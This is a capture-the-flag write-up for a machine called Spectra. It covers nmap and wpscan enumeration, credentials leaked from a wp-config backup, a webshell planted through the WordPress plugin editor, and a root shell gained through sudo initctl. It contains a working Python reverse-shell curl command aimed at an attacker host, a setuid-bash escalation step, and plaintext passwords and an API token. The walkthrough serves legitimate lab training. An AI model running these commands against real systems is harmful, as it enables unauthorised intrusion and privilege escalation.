# Spectra

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 10.129.244.152
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-30 23:05 +08
Nmap scan report for 10.129.244.152
Host is up (0.0055s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
```

HTTP and MySQL are open. I did a detailed scan as well:

```
$ nmap -p 80,3306 -sC -sV --min-rate 3000 10.129.244.152
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-30 23:07 +08
Nmap scan report for 10.129.244.152
Host is up (0.010s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx 1.17.4
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.17.4
3306/tcp open  mysql   MySQL (unauthorized)
```

We can start Burpsuite and begin enumerating the web service.

### Web Enum -> WP Creds

The website just showed two links, and mentions Jira, which is a ticket tracker software.

![](<../../../.gitbook/assets/image (4213).png>)

When the page HTML is viewed, we can see where the link takes us.

![](<../../../.gitbook/assets/image-1 (1).png>)

After adding `spectra.htb` to the `/etc/hosts` file, we can take a look at what software the websites are running. The first website brought me to a Wordpress site:

<figure><img src="../../../.gitbook/assets/image (4214).png" alt=""><figcaption></figcaption></figure>

We can use `wpscan` to enumerate the website for us. This was an older machine, so Wordpress Core will definitely be outdated. There were quite a few plugins found to be outdated, but I didn't manage to exploit them. `wpscan` did find one user though:

{% code overflow="wrap" %}
```
$ wpscan --api-token OaDWLYrOpxOTaXsUq9DUaM8WuIDhSSJ1Ifkyujyn2l0 --enumerate p,u,t --plugins-detection aggressive --url spectra.htb/main/

[i] User(s) Identified:

[+] administrator
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
```
{% endcode %}

Anyways, moving to the `testing/index.php` site, it just shows us an error:

<figure><img src="../../../.gitbook/assets/image (4215).png" alt=""><figcaption></figcaption></figure>

Loading the `/testing` directory shows us a listing:

<figure><img src="../../../.gitbook/assets/image (4216).png" alt=""><figcaption></figcaption></figure>

What's interesting was the `.save` file, which could actually be read with `curl` to find credentials:

```
$ curl http://spectra.htb/testing/wp-config.php.save
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'dev' );

/** MySQL database username */
define( 'DB_USER', 'devtest' );

/** MySQL database password */
define( 'DB_PASSWORD', 'devteam01' );
```

Using this password, we can login as `administrator` to the Wordpress site. Using this, I tried to get a reverse shell by manipulating the `404.php` within the theme being used.

<figure><img src="../../../.gitbook/assets/image (4217).png" alt=""><figcaption></figcaption></figure>

However, this error popped up:

<figure><img src="../../../.gitbook/assets/image (4218).png" alt=""><figcaption></figcaption></figure>

We'll have to find a different method to get a shell.

### Akismet Plugin -> RCE

There are 2 plugins installed on the site:

<figure><img src="../../../.gitbook/assets/image (4219).png" alt=""><figcaption></figcaption></figure>

Instead of finding a public exploit, we can actually edit the plugin directly on Wordpress. Using the Plugin Editor, I replaced the PHP code with a webshell. In this case, I replaced the code for `akismet.php`, and it can be triggered using `curl`:

<figure><img src="../../../.gitbook/assets/image (4220).png" alt=""><figcaption></figcaption></figure>

Then, we can easily get a reverse shell:

{% code overflow="wrap" %}
```bash
$ curl -G --data-urlencode "cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.9\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'" http://spectra.htb/main/wp-content/plugins/akismet/akismet.php
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (4221).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Autologin -> Katie Shell

This machine was a ChromeOS machine, as specified from the `home` directory:

```
nginx@spectra /home $ ls -la
total 32
drwxr-xr-x  8 root    root    4096 Feb  2  2021 .
drwxr-xr-x 22 root    root    4096 Feb  2  2021 ..
drwx------  4 root    root    4096 Jul 20  2020 .shadow
drwxr-xr-x 20 chronos chronos 4096 Sep 30 01:34 chronos
drwxr-xr-x  5 katie   katie   4096 Feb  2  2021 katie
drwxr-xr-x  5 nginx   nginx   4096 Feb  4  2021 nginx
drwxr-x--t  4 root    root    4096 Jul 20  2020 root
drwxr-xr-x  4 root    root    4096 Jul 20  2020 user
```

I didn't know a lot about how ChromeOS functioned, but tools like `pspy64` didn't work. Within the `/opt` directory, there were some interesting files:

```
nginx@spectra /opt $ ls -la
total 44
drwxr-xr-x 10 root root 4096 Feb  3  2021 .
drwxr-xr-x 22 root root 4096 Feb  2  2021 ..
drwxr-xr-x  2 root root 4096 Jun 28  2020 VirtualBox
-rw-r--r--  1 root root  978 Feb  3  2021 autologin.conf.orig
drwxr-xr-x  2 root root 4096 Jan 15  2021 broadcom
drwxr-xr-x  2 root root 4096 Jan 15  2021 displaylink
drwxr-xr-x  2 root root 4096 Jan 15  2021 eeti
drwxr-xr-x  5 root root 4096 Jan 15  2021 google
drwxr-xr-x  6 root root 4096 Feb  2  2021 neverware
drwxr-xr-x  5 root root 4096 Jan 15  2021 tpm1
drwxr-xr-x  5 root root 4096 Jan 15  2021 tpm2
```

The `autologin.conf` file contained some interesting stuff:

```
# Copyright 2016 The Chromium OS Authors. All rights reserved.
# Use of this source code is governed by a BSD-style license that can be
# found in the LICENSE file.
description   "Automatic login at boot"
author        "chromium-os-dev@chromium.org"
# After boot-complete starts, the login prompt is visible and is accepting
# input.
start on started boot-complete
script
  passwd=
  # Read password from file. The file may optionally end with a newline.
  for dir in /mnt/stateful_partition/etc/autologin /etc/autologin; do
    if [ -e "${dir}/passwd" ]; then
      passwd="$(cat "${dir}/passwd")"
      break
    fi
  done
  if [ -z "${passwd}" ]; then
    exit 0
  fi
  # Inject keys into the login prompt.
  #
  # For this to work, you must have already created an account on the device.
  # Otherwise, no login prompt appears at boot and the injected keys do the
  # wrong thing.
  /usr/local/sbin/inject-keys.py -s "${passwd}" -k enter
```

From what I gathered, there's a password in the `/etc/autologin` directory:

```
nginx@spectra /etc/autologin $ ls
passwd
nginx@spectra /etc/autologin $ cat passwd 
SummerHereWeCome!!
```

Using this, we can `ssh` in as `katie`.

<figure><img src="../../../.gitbook/assets/image (4222).png" alt=""><figcaption></figcaption></figure>

### Sudo Privileges -> Root

This user could run `initctl` as the `root` user:

```
katie@spectra ~ $ sudo -l
User katie may run the following commands on spectra:
    (ALL) SETENV: NOPASSWD: /sbin/initctl
```

This binary allows us to initialise daemons:

```
katie@spectra ~ $ /sbin/initctl help
Job commands:
  start                       Start job.
  stop                        Stop job.
  restart                     Restart job.
  reload                      Send HUP signal to job.
  status                      Query status of job.
  list                        List known jobs.

Event commands:
  emit                        Emit an event.

Other commands:
  reload-configuration        Reload the configuration of the init daemon.
  version                     Request the version of the init daemon.
  log-priority                Change the minimum priority of log messages from the init
                                daemon
  show-config                 Show emits, start on and stop on details for job
                                configurations.
  help                        display list of commands

For more information on a command, try `initctl COMMAND --help'
```

Also, I checked which files were owned by `katie` and the `developers` group:

```
katie@spectra / $ find / -group developers 2>/dev/null
/etc/init/test6.conf
/etc/init/test7.conf
/etc/init/test3.conf
/etc/init/test4.conf
/etc/init/test.conf
/etc/init/test8.conf
/etc/init/test9.conf
/etc/init/test10.conf
/etc/init/test2.conf
/etc/init/test5.conf
/etc/init/test1.conf
/srv
/srv/nodetest.js
```

It appears that we own quite a few `test.conf` files, meaning that we can edit it. The configuration files contained some bash lines:

```
$ cat /etc/init/test.conf 
description "Test node.js server"
author      "katie"

start on filesystem or runlevel [2345]
stop on shutdown

script

    export HOME="/srv"
    echo $$ > /var/run/nodetest.pid
    exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js

end script

pre-start script
    echo "[`date`] Node Test Starting" >> /var/log/nodetest.log
end script

pre-stop script
    rm /var/run/nodetest.pid
    echo "[`date`] Node Test Stopping" >> /var/log/nodetest.log
end script
```

I added `chmod u+s /bin/bash` to `test2.conf`, and then started the process. Then, we can easily get a `root` shell:

<figure><img src="../../../.gitbook/assets/image (4223).png" alt=""><figcaption></figcaption></figure>
